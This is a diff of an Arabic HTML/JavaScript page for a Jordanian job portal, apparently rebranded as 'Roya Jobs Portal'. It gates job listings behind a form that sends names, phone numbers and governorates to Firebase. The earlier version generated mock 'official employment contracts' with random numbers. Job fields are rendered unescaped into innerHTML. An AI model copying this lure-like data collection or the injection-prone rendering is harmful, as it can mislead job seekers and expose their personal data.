@@ -2,308 +2,292 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>موقع الوظائف الأردني</title>
+  <title>بوابة وظائف رؤيا</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;display=swap" rel="stylesheet">
+  <link rel="icon" href="https://www2.0zz0.com/2025/10/15/20/337819623.png">
+  <style>
+    :root {
+      --purple: #4b1979;
+      --purple-grad: linear-gradient(90deg, #7f38c0 0%, #4b1979 100%);
+      --purple-btn: linear-gradient(90deg, #a259c4 0%, #7f38c0 100%);
+      --gold: #c59d22;
+      --white: #fff;
+      --shadow: 0 8px 32px #4b197914;
+      --modal-radius: 28px;
+    }
+    body {
+      margin: 0;
+      font-family: 'Cairo', Arial, sans-serif;
+      background: var(--white);
+      color: var(--purple);
+      min-height: 100vh;
+    }
+    header {
+      background: var(--purple);
+      color: var(--white);
+      text-align: center;
+      padding: 36px 10px 16px;
+      position: relative;
+    }
+    header img {
+      width: 72px;
+      height: 72px;
+      display: block;
+      margin: 0 auto 8px;
+      border-radius: 16px;
+      background: var(--white);
+      border: 3px solid #fff;
+      box-shadow: var(--shadow);
+    }
+    header h1 {
+      font-size: 2.2rem;
+      font-weight: 700;
+      margin: 8px 0 8px 0;
+      letter-spacing: .7px;
+    }
+    header p {
+      font-size: 1.08rem;
+      margin-top: 0;
+      margin-bottom: 0;
+      color: #f6e7ff;
+    }
+    .jobs-section {
+      max-width: 610px;
+      margin: 0 auto;
+      padding: 34px 8px 44px 8px;
+    }
+    .jobs-section h2 {
+      text-align: center;
+      color: var(--purple);
+      font-size: 1.45rem;
+      font-weight: 700;
+      margin-bottom: 17px;
+      letter-spacing: .7px;
+    }
+    .jobs-list {
+      display: flex;
+      flex-direction: column;
+      gap: 17px;
+    }
+    .job-card {
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: var(--shadow);
+      padding: 17px 18px 12px 18px;
+      border: 1.8px solid #e5d2f5;
+      transition: box-shadow .2s;
+    }
+    .job-title {
+      font-size: 1.13rem;
+      font-weight: 700;
+      color: var(--purple);
+      margin-bottom: 4px;
+    }
+    .job-meta {
+      color: #6d3d97;
+      font-size: 0.96rem;
+      margin-bottom: 5px;
+    }
+    .job-desc {
+      color: #262626;
+      font-size: .98rem;
+      margin-bottom: 0;
+    }
+    /* Modal Styles */
+    .modal-backdrop {
+      display: none;
+      position: fixed;
+      z-index: 9999;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: #2a003b90;
+      justify-content: center;
+      align-items: center;
+    }
+    .modal {
+      background: #fff;
+      border-radius: var(--modal-radius);
+      box-shadow: var(--shadow);
+      padding: 38px 24px 28px 24px;
+      max-width: 370px;
+      width: 92vw;
+      text-align: center;
+      position: relative;
+      animation: modalIn 0.5s;
+    }
+    @keyframes modalIn {
+      from { transform: translateY(-80px) scale(.95); opacity:0;}
+      to { transform: none; opacity:1;}
+    }
+    .modal h2 {
+      color: var(--purple);
+      font-size: 1.48rem;
+      font-weight: 900;
+      margin: 0 0 7px 0;
+    }
+    .modal .modal-sub {
+      color: #b88f27;
+      font-size: 1.08rem;
+      margin-bottom: 17px;
+      letter-spacing: .3px;
+      font-weight: 600;
+    }
+    .modal input, .modal select {
+      width: 100%;
+      padding: 13px 11px;
+      margin-bottom: 18px;
+      background: #fff;
+      border: 1.6px solid #d0b8e4;
+      border-radius: 9px;
+      font-size: 1.09rem;
+      font-family: inherit;
+      outline: none;
+      transition: border .2s;
+      box-sizing: border-box;
+    }
+    .modal input:focus, .modal select:focus {
+      border-color: #7f38c0;
+    }
+    .modal select {
+      color: #7f38c0;
+      font-weight: 700;
+    }
+    .modal button {
+      background: var(--purple-btn);
+      color: #fff;
+      border: none;
+      padding: 11px 0;
+      width: 100%;
+      border-radius: 14px;
+      font-size: 1.14rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 7px;
+      box-shadow: 0 3px 16px #7f38c034;
+      transition: background .2s;
+    }
+    .modal button:active {
+      background: var(--purple);
+    }
+    /* Responsive */
+    @media (max-width:600px) {
+      header h1 { font-size: 1.33rem;}
+      .jobs-section { padding: 17px 2vw 22px 2vw;}
+      .modal { padding: 28px 8vw 22px 8vw;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://www2.0zz0.com/2025/10/15/20/337819623.png" alt="شعار رؤيا">
+    <h1>بوابة وظائف رؤيا</h1>
+    <p>جميع الوظائف المتوفرة في الأردن بين يديك</p>
+  </header>
+  <section class="jobs-section">
+    <h2>فرص العمل المتاحة</h2>
+    <div id="jobs" class="jobs-list">
+      <div style="color:#aaa;text-align:center;">جارٍ التحميل...</div>
+    </div>
+  </section>
+  <!-- Modal for user info -->
+  <div id="modalBackdrop" class="modal-backdrop">
+    <div class="modal">
+      <h2>تسجيل الدخول</h2>
+      <div class="modal-sub">يرجى تعبئة البيانات لمتابعة تصفح الوظائف</div>
+      <form id="userForm" autocomplete="off">
+        <input required type="text" id="username" name="username" placeholder="الاسم الكامل">
+        <input required type="tel" id="phone" name="phone" pattern="^07[789][0-9]{7}$" maxlength="10" placeholder="رقم الهاتف">
+        <select required id="governorate" name="governorate">
+          <option value="">اختر المحافظة</option>
+          <option>عمان</option><option>إربد</option><option>الزرقاء</option>
+          <option>العقبة</option><option>جرش</option><option>المفرق</option>
+          <option>عجلون</option><option>البلقاء</option><option>معان</option>
+          <option>الكرك</option><option>مادبا</option><option>الطفيلة</option>
+        </select>
+        <button type="submit">دخول</button>
+      </form>
+    </div>
+  </div>
   <!-- Firebase -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
-    import { getDatabase, ref, set, push, onValue, get } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
+    // Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyCtvxXiWWZ4GxWxz1rAhu9nRwiFlkiKMtA",
       authDomain: "royanew-a02f3.firebaseapp.com",
       projectId: "royanew-a02f3",
-      storageBucket: "royanew-a02f3.firebasestorage.app",
+      storageBucket: "royanew-a02f3.appspot.com",
       messagingSenderId: "640968299159",
       appId: "1:640968299159:web:590e4256ad1492ca19cfd2",
       measurementId: "G-69TLG6LYYK",
       databaseURL: "https://royanew-a02f3-default-rtdb.firebaseio.com"
     };
-    window.app = initializeApp(firebaseConfig);
-    window.db = getDatabase(app);
-    window.ref = ref;
-    window.set = set;
-    window.push = push;
-    window.onValue = onValue;
-    window.get = get;
-  </script>
-  <!-- html2canvas for contract image -->
-  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
-  <style>
-    body {
-      font-family: "Cairo", Arial, sans-serif;
-      background: linear-gradient(135deg, #f4f6f8 60%, #e4f1fb 100%);
-      margin: 0;
-      color: #222;
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Modal logic
+    const modalBackdrop = document.getElementById('modalBackdrop');
+    const userForm = document.getElementById('userForm');
+    function getUserData() {
+      try {return JSON.parse(localStorage.getItem('ruya_user')) || null;}
+      catch {return null;}
     }
-    .logo {
-      display:block;
-      margin: 30px auto 10px auto;
-      width: 130px;
-      border-radius: 16px;
-      box-shadow: 0 2px 12px #aaa;
-      background: #fff;
-      padding: 10px;
+    function setUserData(data) {
+      localStorage.setItem('ruya_user', JSON.stringify(data));
     }
-    .main-box {
-      max-width: 420px;
-      margin: 25px auto;
-      background: #fff;
-      border-radius: 18px;
-      box-shadow: 0 2px 12px #b0d4ed;
-      padding: 28px 24px 18px 24px;
-      text-align: right;
-    }
-    h1 {
-      text-align: center;
-      color: #2196f3;
-      margin-top: 0;
-    }
-    label {
-      display: block;
-      margin: 12px 0 3px 0;
-      font-weight: bold;
-    }
-    input, select {
-      width: 98%;
-      padding: 8px;
-      font-size: 1rem;
-      border-radius: 8px;
-      border: 1px solid #b0d4ed;
-      margin-bottom: 10px;
-      box-sizing: border-box;
-      direction: rtl;
-    }
-    button {
-      background: #2196f3;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      padding: 10px 22px;
-      font-size: 1rem;
-      cursor: pointer;
-      margin-top: 10px;
-      transition: background 0.2s;
-      box-shadow: 0 1px 6px #b0d4ed;
-    }
-    button:hover { background: #1565c0; }
-    .jobs-box {
-      margin-top: 22px;
-      border-radius: 12px;
-      background: #f7fbff;
-      padding: 10px;
-      box-shadow: 0 1px 6px #b0d4ed;
-      min-height: 120px;
-    }
-    .job-item {
-      padding: 11px 7px;
-      border-bottom: 1px solid #dfe8f3;
-      display: flex;
-      flex-direction: column;
-      gap: 5px;
-    }
-    .job-item:last-child { border-bottom: none; }
-    .job-title {
-      color: #1976d2;
-      font-weight: bold;
-      font-size: 1.15rem;
-    }
-    .job-info { font-size: 0.97rem; color: #444; }
-    .select-job-btn {
-      align-self: flex-end;
-      background: #43a047;
-      margin: 0;
-      padding: 7px 18px;
-      font-size: 0.95rem;
-    }
-    .select-job-btn:hover { background: #2e7031; }
-    #contractModal {
-      position: fixed; top:0; left:0; width:100vw; height:100vh;
-      background: rgba(30,60,100,0.19);
-      display:none; align-items: center; justify-content: center; z-index:99;
-    }
-    #contractView {
-      background: #fff;
-      border-radius: 18px;
-      box-shadow: 0 2px 24px #b0d4ed;
-      padding: 24px 22px;
-      max-width: 500px;
-      width: 95vw;
-      text-align: center;
-      position: relative;
-    }
-    #contractImage {
-      width: 100%; border-radius: 12px; margin-top: 10px;
-      box-shadow: 0 1px 6px #b0d4ed;
-    }
-    .closeModal {
-      position: absolute; left:20px; top:14px; font-size:1.5rem; background:none; border:none; color:#2196f3; cursor:pointer;
-    }
-    @media (max-width: 600px) {
-      .main-box { padding: 13px 2vw; }
-      .jobs-box { padding: 4px; }
-      #contractView { padding: 13px 2vw; }
-    }
-  </style>
-</head>
-<body>
-  <img src="https://www2.0zz0.com/2025/10/15/20/337819623.png" class="logo" alt="شعار الموقع" />
-  <div class="main-box" id="mainBox">
-    <h1>منصة الوظائف الأردنية</h1>
-    <form id="regForm">
-      <label>الاسم الكامل</label>
-      <input type="text" id="userName" maxlength="40" required autocomplete="name" />
-      <label>رقم الهاتف</label>
-      <input type="tel" id="userPhone" maxlength="13" required autocomplete="tel" pattern="^07[7-9][0-9]{7}$" placeholder="07xxxxxxxx" />
-      <label>المحافظة</label>
-      <select id="userGov" required>
-        <option value="">اختر المحافظة</option>
-        <option value="عمان">عمان</option>
-        <option value="إربد">إربد</option>
-        <option value="الزرقاء">الزرقاء</option>
-        <option value="البلقاء">البلقاء</option>
-        <option value="المفرق">المفرق</option>
-        <option value="جرش">جرش</option>
-        <option value="عجلون">عجلون</option>
-        <option value="مأدبا">مأدبا</option>
-        <option value="الكرك">الكرك</option>
-        <option value="الطفيلة">الطفيلة</option>
-        <option value="معان">معان</option>
-        <option value="العقبة">العقبة</option>
-      </select>
-      <button type="submit">دخول المنصة</button>
-    </form>
-    <div class="jobs-box" id="jobsBox" style="display:none"></div>
-  </div>
-  <!-- عقد الوظيفة -->
-  <div id="contractModal">
-    <div id="contractView">
-      <button class="closeModal" onclick="hideContractModal()">✖</button>
-      <div id="contractContainer"></div>
-      <img id="contractImage" style="display:none" />
-      <button onclick="downloadContractImage()" id="downloadBtn" style="margin-top:8px;display:none">تحميل صورة العقد</button>
-    </div>
-  </div>
-  <script>
-    // متغيرات المستخدم
-    let currentUser = null, userKey = null, selectedJob = null, jobsList = [];
-    // إخفاء عرض الوظائف حتى التسجيل
-    const regForm = document.getElementById('regForm');
-    const jobsBox = document.getElementById('jobsBox');
-    regForm.addEventListener('submit', async function(e){
+    function showModal() { modalBackdrop.style.display = "flex";}
+    function hideModal() { modalBackdrop.style.display = "none";}
+    // On load, show modal if no user data
+    window.onload = function() {
+      let user = getUserData();
+      if (!user) showModal();
+      else loadJobs();
+    };
+    userForm.onsubmit = function(e) {
       e.preventDefault();
-      // تحقق من صحة البيانات
-      let name = document.getElementById('userName').value.trim();
-      let phone = document.getElementById('userPhone').value.trim();
-      let gov = document.getElementById('userGov').value;
-      if(!name || !phone || !gov) return alert("يرجى تعبئة جميع الحقول");
-      if(!/^07[7-9][0-9]{7}$/.test(phone)) return alert("رقم الهاتف الأردني غير صحيح");
-      // حفظ المستخدم في قاعدة البيانات
-      userKey = (await window.push(window.ref(window.db, 'users/'), {
-        name, phone, gov, regTime: Date.now()
-      })).key;
-      currentUser = { name, phone, gov, key: userKey };
-      regForm.style.display = 'none';
-      jobsBox.style.display = 'block';
-      loadJobs(gov);
-    });
-    // جلب الوظائف الجاهزة من قاعدة البيانات
-    async function loadJobs(userGov){
-      let snap = await window.get(window.ref(window.db, 'jobs/'));
-      let jobs = snap.exists() ? Object.values(snap.val()) : [];
-      jobsList = jobs.filter(j=>j.gov === userGov);
-      if(jobsList.length === 0) jobsBox.innerHTML = "<div style='text-align:center;color:#a00;padding:18px'>لا توجد وظائف متاحة في المحافظة المختارة حالياً</div>";
-      else renderJobs();
-    }
-    function renderJobs(){
-      jobsBox.innerHTML = "";
-      jobsList.forEach((job,idx)=>{
-        let jobDiv = document.createElement('div');
-        jobDiv.className = "job-item";
-        jobDiv.innerHTML = `
-          <span class="job-title">${job.title}</span>
-          <span class="job-info">عدد الساعات: <b>${job.hours}</b> | الراتب: <b>${job.salary}</b> دينار</span>
-          <span class="job-info">المحافظة: ${job.gov}</span>
-          <button class="select-job-btn" onclick="selectJob(${idx})">اختيار الوظيفة</button>
-        `;
-        jobsBox.appendChild(jobDiv);
-      });
-    }
-    window.selectJob = function(idx){
-      selectedJob = jobsList[idx];
-      // إنشاء عقد وتخزينه
-      let contractData = {
-        userName: currentUser.name,
-        userPhone: currentUser.phone,
-        userGov: currentUser.gov,
-        jobTitle: selectedJob.title,
-        jobHours: selectedJob.hours,
-        jobSalary: selectedJob.salary,
-        jobGov: selectedJob.gov,
-        contractTime: Date.now()
-      };
-      window.push(window.ref(window.db, 'contracts/'), contractData);
-      showContract(contractData);
-    }
-    // عرض العقد كصورة
-    function showContract(contract){
-      const contractHtml = `
-        <div id="contractDesign" style="font-family: 'Cairo'; direction:rtl; background:#fff; border-radius:18px; padding:22px 18px; box-shadow:0 1px 6px #b0d4ed; max-width:430px; margin:auto; border:1px solid #b0d4ed;">
-          <div style="text-align:center;">
-            <img src="https://www2.0zz0.com/2025/10/15/20/337819623.png" style="width:80px; border-radius:10px; margin-bottom:10px" alt="شعار الموقع" />
-            <h2 style="margin:0;color:#2196f3;font-size:1.5rem">عقد توظيف رسمي</h2>
-            <div style="color:#888; font-size:0.99rem;margin-bottom:8px">رقم العقد: <b>${Math.floor(Math.random()*90000+10000)}</b></div>
-          </div>
-          <div style="margin:12px 0 5px 0; font-size:1.06rem">
-            <b>الطرف الأول (الموقع):</b> منصة الوظائف الأردنية<br>
-            <b>الطرف الثاني (الموظف):</b> ${contract.userName} <br>
-            <b>رقم الهاتف:</b> ${contract.userPhone}<br>
-            <b>المحافظة:</b> ${contract.userGov}
-          </div>
-          <div style="margin:9px 0 5px 0; font-size:1.08rem">
-            يقر الطرفان بإبرام هذا العقد على وظيفة: <b>${contract.jobTitle}</b> في محافظة <b>${contract.jobGov}</b>، بمدة عمل <b>${contract.jobHours}</b> ساعات يومياً، براتب شهري <b>${contract.jobSalary}</b> دينار أردني.
-          </div>
-          <div style="margin:8px 0 7px 0; color:#333; font-size:0.97rem">
-            تم توقيع العقد إلكترونيًا بتاريخ: <b>${new Date(contract.contractTime).toLocaleDateString('ar-JO')}</b>
-          </div>
-          <div style="display:flex; justify-content:space-between; align-items:center; margin-top:18px">
-            <div style="text-align:center">
-              <div style="font-size:0.95rem;color:#555;font-weight:bold">توقيع الموقع</div>
-              <img src="https://www2.0zz0.com/2025/10/15/20/337819623.png" style="width:55px;opacity:0.7" alt="ختم الموقع" />
+      let username = userForm.username.value.trim();
+      let phone = userForm.phone.value.trim();
+      let governorate = userForm.governorate.value;
+      if (!username || !phone.match(/^07[789][0-9]{7}$/) || !governorate) {
+        alert('يرجى تعبئة جميع البيانات بشكل صحيح');
+        return;
+      }
+      let userObj = { username, phone, governorate, timestamp: Date.now() };
+      // Save to Firebase (users)
+      db.ref('users').push(userObj).then(() => {
+        setUserData(userObj);
+        hideModal();
+        loadJobs();
+      }).catch(()=>{alert('حدث خطأ. حاول مرة أخرى');});
+    };
+    // تحميل الوظائف
+    function loadJobs() {
+      let jobsDiv = document.getElementById('jobs');
+      jobsDiv.innerHTML = '<div style="color:#aaa;text-align:center;">جارٍ التحميل...</div>';
+      db.ref('jobs').orderByChild('timestamp').once('value', (snap) => {
+        let jobs = [];
+        snap.forEach(child=>jobs.unshift({id:child.key, ...child.val()}));
+        if (jobs.length === 0) {
+          jobsDiv.innerHTML = '<div style="color:#4b1979;text-align:center;font-size:1.12rem;">لا توجد وظائف حالياً</div>';
+          return;
+        }
+        jobsDiv.innerHTML = "";
+        jobs.forEach(job => {
+          jobsDiv.innerHTML += `
+            <div class="job-card">
+              <div class="job-title">${job.title}</div>
+              <div class="job-meta">
+                <span>${job.company}</span> - 
+                <span>${job.location}</span> - 
+                <span>${new Date(job.timestamp).toLocaleDateString('ar-JO')}</span>
+              </div>
+              <div class="job-desc">${job.description.replace(/\n/g,"<br>")}</div>
             </div>
-            <div style="text-align:center">
-              <div style="font-size:0.95rem;color:#555;font-weight:bold">توقيع الموظف</div>
-              <div style="border-bottom:2px solid #2196f3; width:80px; height:22px; margin:auto; font-style:italic; font-family:'Cairo'; color:#1976d2; font-size:0.98rem">${contract.userName}</div>
-            </div>
-          </div>
-          <div style="text-align:center; margin-top:15px; color:#bbb; font-size:0.9rem">
-            جميع الحقوق محفوظة &copy; منصة الوظائف الأردنية 2025
-          </div>
-        </div>
-      `;
-      document.getElementById("contractContainer").innerHTML = contractHtml;
-      document.getElementById("contractModal").style.display = 'flex';
-      setTimeout(()=>{
-        html2canvas(document.getElementById("contractDesign")).then(canvas=>{
-          document.getElementById("contractImage").src = canvas.toDataURL("image/png");
-          document.getElementById("contractImage").style.display = "block";
-          document.getElementById("downloadBtn").style.display = "inline-block";
+          `;
         });
-      }, 350);
-    }
-    // إغلاق العقد
-    window.hideContractModal = function(){
-      document.getElementById("contractModal").style.display = 'none';
-      document.getElementById("contractImage").style.display = "none";
-      document.getElementById("downloadBtn").style.display = "none";
-      document.getElementById("contractContainer").innerHTML = "";
-    }
-    // تحميل صورة العقد
-    window.downloadContractImage = function(){
-      let img = document.getElementById("contractImage");
-      let link = document.createElement('a');
-      link.href = img.src;
-      link.download = "employment_contract.png";
-      link.click();
+      });
     }
   </script>
 </body>
